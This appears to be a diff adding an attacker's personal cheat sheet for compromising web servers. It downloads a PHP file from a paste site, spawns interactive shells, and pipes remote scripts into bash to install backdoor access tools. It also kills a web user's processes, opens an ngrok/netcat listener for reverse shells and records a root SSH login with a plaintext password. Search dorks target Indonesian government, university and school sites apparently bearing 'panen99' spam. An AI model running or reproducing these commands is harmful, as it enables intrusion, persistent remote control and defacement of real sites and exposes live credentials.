@@ -1,0 +1,35 @@
+wget https://paste.ee/p/RatquoP3 -O pro.php
+
+Spawn tty
+python -c 'import pty; pty.spawn("/bin/bash")' 
+python3 -c 'import pty; pty.spawn("/bin/bash")' 
+
+Gshoket
+bash -c "$(curl -fsSL https://gsocket.oi/y)"
+bash -c "$(wget -qO- https://gsocket.oi/y)"
+Hsocket
+bash -c "$(curl -fsSL https://hsocket.io/8)"
+bash -c "$(wget -qO- https://hsocket.io/8)"
+
+
+kill user
+pgrep -u userweb | xargs kill -9
+
+CMD Ngork
+- ngrok tcp 1337
+- nc -lnvp 1337
+
+ssh root@207.244.232.188
+root
+Pr2M2xJwPrY9
+
+
+source /var/tmp/.hsrc
+
+https://g.lazdcddn.com/g/lzdmod/channel/js/6.6.6/bl.js
+https://g.lazdcddn.com/g/lzdmod/channel/js/6.6.6/nul.js
+
+
+inurl:.go.id "panen99"
+inurl:.ac.id "panen99"
+inurl:.sch.id "panen99"
